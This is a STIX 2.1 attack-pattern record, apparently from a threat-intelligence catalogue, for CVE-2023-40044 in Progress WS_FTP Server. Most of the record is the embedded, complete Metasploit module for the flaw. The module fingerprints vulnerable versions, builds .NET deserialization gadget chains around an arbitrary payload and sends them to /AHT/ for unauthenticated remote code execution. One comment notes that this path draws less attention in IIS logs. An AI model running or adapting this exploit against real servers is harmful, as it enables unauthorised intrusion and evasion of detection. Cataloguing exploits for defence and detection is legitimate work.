{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d53b9352-1211-441e-9814-71b4c9df5eb2",
    "created": "2024-08-14T16:53:19.702346Z",
    "modified": "2024-08-14T16:53:19.70235Z",
    "name": "Progress Software WS_FTP Unauthenticated Remote Code Execution",
    "description": " This module exploits an unsafe .NET deserialization vulnerability to achieve unauthenticated remote code execution against a vulnerable WS_FTP server running the Ad Hoc Transfer module. All versions of WS_FTP Server prior to 2020.0.4 (version 8.7.4) and 2022.0.2 (version 8.8.2) are vulnerable to this issue. The vulnerability was originally discovered by AssetNote.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/ws_ftp_rce_cve_2023_40044.rb",
            "external_id": "ws_ftp_rce_cve_2023_40044.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-40044"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/bn32f9sNax/cve-2023-40044/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://community.progress.com/s/article/WS-FTP-Server-Critical-Vulnerability-September-2023"
        },
        {
            "source_name": "reference",
            "url": "https://www.assetnote.io/resources/research/rce-in-progress-ws-ftp-ad-hoc-via-iis-http-modules-cve-2023-40044"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Progress Software WS_FTP Unauthenticated Remote Code Execution',\n        'Description' => %q{\n          This module exploits an unsafe .NET deserialization vulnerability to achieve unauthenticated remote code\n          execution against a vulnerable WS_FTP server running the Ad Hoc Transfer module. All versions of WS_FTP Server\n          prior to 2020.0.4 (version 8.7.4) and 2022.0.2 (version 8.8.2) are vulnerable to this issue. The vulnerability\n          was originally discovered by AssetNote.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'sfewer-r7', # MSF Exploit & Rapid7 Analysis\n        ],\n        'References' => [\n          ['CVE', '2023-40044'],\n          ['URL', 'https://attackerkb.com/topics/bn32f9sNax/cve-2023-40044/rapid7-analysis'],\n          ['URL', 'https://community.progress.com/s/article/WS-FTP-Server-Critical-Vulnerability-September-2023'],\n          ['URL', 'https://www.assetnote.io/resources/research/rce-in-progress-ws-ftp-ad-hoc-via-iis-http-modules-cve-2023-40044']\n        ],\n        'DisclosureDate' => '2023-09-27',\n        'Platform' => %w[win],\n        'Arch' => [ARCH_CMD],\n        # 5000 will allow the powershell payloads to work as they require ~4200 bytes. Notably, the ClaimsPrincipal and\n        # TypeConfuseDelegate (but not TextFormattingRunProperties) gadget chains will fail if Space is too large (e.g.\n        # 8192 bytes), as the encoded payload command is padded with leading whitespace characters (0x20) to consume\n        # all the available payload space via ./modules/nops/cmd/generic.rb).\n        'Payload' => { 'Space' => 5000 },\n        'Privileged' => false, # Code execution as `NT AUTHORITY\\NETWORK SERVICE`.\n        'Targets' => [\n          [\n            'Windows', {}\n          ]\n        ],\n        'DefaultOptions' => {\n          'RPORT' => 443,\n          'SSL' => true\n        },\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        # This URI path can be anything so long as it begins with /AHT/. We default ot /AHT/ as it is less obvious in\n        # the IIS logs as to what the request is for, however the user can change this as needed if required.\n        Msf::OptString.new('TARGET_URI', [ false, 'Target URI used to exploit the deserialization vulnerability. Must begin with /AHT/', '/AHT/']),\n      ]\n    )\n  end\n\n  def check\n    # As the vulnerability lies in the WS_FTP Ad Hoc Transfer (AHT) module, we query the index HTML file for AHT.\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => '/AHT/AHT_UI/public/index.html'\n    )\n\n    return CheckCode::Unknown('Connection failed') unless res\n\n    title = Nokogiri::HTML(res.body).xpath('//head/title')&.text\n\n    # We verify the target is running the AHT module, by inspecting the HTML heads title.\n    if title == 'Ad Hoc Transfer'\n      res = send_request_cgi(\n        'method' => 'GET',\n        'uri' => '/AHT/AHT_UI/public/js/app.min.js'\n      )\n\n      return CheckCode::Unknown('Connection failed') unless res\n\n      # The patched versions were released on September 2023. We can query the date stamp in the app.min.js file\n      # to see when this file was built. If it is before Sept 2023, then we have a vulnerable version of WS_FTP,\n      # but if it was build on Sept 2023 or after, it is not vulnerable.\n\n      if res.code == 200 && res.body =~ %r{/\\*! fileTransfer (\\d+)-(\\d+)-(\\d+) \\*/}\n        day = ::Regexp.last_match(1).to_i\n        month = ::Regexp.last_match(2).to_i\n        year = ::Regexp.last_match(3).to_i\n\n        description = \"Detected a build date of #{day}-#{month}-#{year}\"\n\n        if year > 2023 || (year == 2023 && month >= 9)\n          return CheckCode::Safe(description)\n        end\n\n        return CheckCode::Appears(description)\n      end\n\n      # If we couldn't get the JS build date, we at least know the target is WS_FTP with the Ad Hoc Transfer module.\n      return CheckCode::Detected\n    end\n\n    CheckCode::Unknown\n  end\n\n  def exploit\n    unless datastore['TARGET_URI'].start_with? '/AHT/'\n      fail_with(Failure::BadConfig, 'The TARGET_URI must begin with /AHT/')\n    end\n\n    # All of these gadget chains will work. We pick a random one during exploitation.\n    chains = %i[ClaimsPrincipal TypeConfuseDelegate TextFormattingRunProperties]\n\n    gadget = ::Msf::Util::DotNetDeserialization.generate(\n      payload.encoded,\n      gadget_chain: chains.sample,\n      formatter: :BinaryFormatter\n    )\n\n    # We can reach the unsafe deserialization via either of these tags. We pick a random one during exploitation.\n    tags = %w[AHT_DEFAULT_UPLOAD_PARAMETER AHT_UPLOAD_PARAMETER]\n\n    message = Rex::MIME::Message.new\n\n    part = message.add_part(\"::#{tags.sample}::#{Rex::Text.encode_base64(gadget)}\\r\\n\", nil, nil, nil)\n\n    part.header.set('name', rand_text_alphanumeric(8))\n\n    res = send_request_cgi(\n      {\n        'uri' => normalize_uri(datastore['TARGET_URI']),\n        'ctype' => 'multipart/form-data; boundary=' + message.bound,\n        'method' => 'POST',\n        'data' => message.to_s\n      }\n    )\n\n    unless res&.code == 302\n      fail_with(Failure::UnexpectedReply, 'Failed to trigger vulnerability')\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2023-09-27",
    "x_mitre_platforms": [
        "%w[win]"
    ]
}